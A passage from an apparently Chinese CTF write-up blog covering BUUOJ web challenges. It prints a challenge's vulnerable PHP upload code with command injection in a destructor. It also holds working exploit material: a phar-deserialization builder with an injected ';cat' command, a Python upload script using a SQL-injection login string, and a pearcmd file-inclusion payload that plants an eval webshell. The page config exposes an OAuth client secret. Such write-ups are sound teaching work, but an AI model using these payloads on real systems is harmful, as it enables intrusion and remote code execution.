class="variable">$filename</span>))&#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>源码逻辑也比较清楚 我寄在了怎么一边上传文件一边post传参</p>
+<p>根据源码逻辑 我们先要登录成功 然后才能上传文件 所以post传参和发包同时弄 我不太会 </p>
+<p>因为这个题目登录成功之后还会退出来 不会留在上传文件的页面 所以我们要手动发包 我只会用现成的脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;http://e8a71e4c-c09f-4e5c-85ff-9c8df9323115.node4.buuoj.cn:81/index.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>所以就寄了 </p>
+<p>赛后看师傅们的wp 是用py脚本的发的 真的太强了</p>
+<p>然后这道题目最明显的就是 FILE类的析构函数存在一个命令执行漏洞然后就能想到是phar反序列化了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么一般我们phar反序列化还要配合能够触发反序列化的文件操作函数才行</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690284296888-8b13e482-f7af-4f9f-9692-14afbbc72175.png" alt="img"></p>
+<p>看了下这道题目源码没有这些函数 但是这次又学到一个函数就是md5_file()</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690284418928-34e41ed9-ef4a-46b1-9611-bca266194f9f.png" alt="img"></p>
+<p>在源码这个地方 如果我们提交get参数 file和todo 那么他将会将我们的文件进行md5_file()后输出</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure>
+
+<p>那么phar反序列化能够搭配的函数又多了一个qwq</p>
+<p>所以思路明确 先phar生成一个包含我们恶意序列化的图片</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="string">&quot;/;cat /adjaskdhnask_flag_is_here_dakjdnmsakjnfksd&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;phartest.phar&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
+
+<p>然后配合脚本 上传上去 偷的<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&amp;mid=2247493970&amp;idx=1&amp;sn=9a20317104c56bd5060763e1461908ea&amp;chksm=e8a1ca83dfd643954775d5e84a80a74876cde679a30db3e581d0bb1553510ada71937299318a&amp;mpshare=1&amp;scene=23&amp;srcid=07256NyrGaLqc95MJJrprw2j&amp;sharer_sharetime=1690256252504&amp;sharer_shareid=122e5be9c4961e59957c3603ed41e762#rd">https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&amp;mid=2247493970&amp;idx=1&amp;sn=9a20317104c56bd5060763e1461908ea&amp;chksm=e8a1ca83dfd643954775d5e84a80a74876cde679a30db3e581d0bb1553510ada71937299318a&amp;mpshare=1&amp;scene=23&amp;srcid=07256NyrGaLqc95MJJrprw2j&amp;sharer_sharetime=1690256252504&amp;sharer_shareid=122e5be9c4961e59957c3603ed41e762#rd</a> 师傅真的太强了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 获取当前脚本文件的目录路径</span></span><br><span class="line">current_directory = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line"><span class="comment"># 构建文件路径</span></span><br><span class="line">image_path = os.path.join(current_directory, <span class="string">&#x27;1.jpg&#x27;</span>)</span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">burp0_url = <span class="string">&quot;http://e8a71e4c-c09f-4e5c-85ff-9c8df9323115.node4.buuoj.cn:81/?&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;su&quot;</span>&#125;</span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.jpg&#x27;</span>, <span class="built_in">open</span>(image_path, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;x&#x27; or 1=1 or &#x27;=&#x27;&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;登录&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(burp0_url, cookies=burp0_cookies, files=files, data=data, proxies=proxy)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"><span class="comment">#burp0_url = &quot;http://8ea14a59-3600-4799-a424-95e815a3d71f.node4.buuoj.cn:81/?file=phar:///var/www/html/1.jpg&amp;todo=md5&quot;</span></span><br><span class="line"><span class="comment">#res = requests.post(burp0_url,              cookies=burp0_cookies,data=data,proxies=proxy)</span></span><br><span class="line"><span class="comment">#print(res.text)</span></span><br></pre></td></tr></table></figure>
+
+<p>先登录+上传文件 然后登录+phar包含</p>
+<p>都是同时进行每一步</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690284835271-ef78e974-b80b-42d8-ba3a-198e46ed4719.png" alt="img"></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690284900264-277755df-bda5-45f3-8a7d-7ffc1906ae9e.png" alt="img"></p>
+<p>又学到了 之后要好好学一下requests这个库和其他常用库</p>
+<h1 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h1><p>熊海cms v1.0 文件包含+pearcmd   第一次见</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690190505171-21e3d749-3951-4d74-ab6a-360007a73ddf.png" alt="img"></p>
+<p>关于pearcmd:</p>
+<p><a target="_blank" rel="noopener" href="https://w4rsp1t3.moe/2021/11/26/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">https://w4rsp1t3.moe/2021/11/26/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p>
+<p>payload:</p>
+<p>这个pearcmd的文件路径很难找 要一个一个试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;r=../../../../../../../../../../../../usr/share/php/pearcmd&amp;/&lt;?=phpinfo();eval($_POST[1]);?&gt;+/tmp/123.php</span><br></pre></td></tr></table></figure>
+
+<p><code>?r=../../../../../../../tmp/123</code>访问rce就行了</p>
+<p>反正我没复现成功 感觉是赛后靶机和比赛的不一样 rce不了 还是我姿势不对 无语了</p>
+<h1 id="ez-py"><a href="#ez-py" class="headerlink" title="ez_py"></a>ez_py</h1><p>考点：django session pickle反序列化 </p>
+<p> 不太会 以后再来看 还是第一次见</p>
+<h1 id="ez-timing"><a href="#ez-timing" class="headerlink" title="ez_timing"></a>ez_timing</h1><p>HTTP/2??????? 6</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/post/d33f9f0e.html" rel="prev" title="buu刷题（page 4-2）">
+                  <i class="fa fa-chevron-left"></i> buu刷题（page 4-2）
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">陇ICP备 2023001761 </a>
+  </div>
+
+<div class="copyright">
+  &copy; 2023.2 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z1d10t</span>
+</div>
+
+
+
+    </div>
+  </footer>
+
+  
+
+  <a href="https://github.com/Z1d10t" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"Z1d10t","repo":"Z1d10t.github.io","client_id":"c9dd41fa890386350257","client_secret":"c78f6b60a410862c2dcc596f09db2f0c06f025c6","admin_user":"Z1d10t","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"3af0ca8ba535420eb41ecef242d85564"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
+
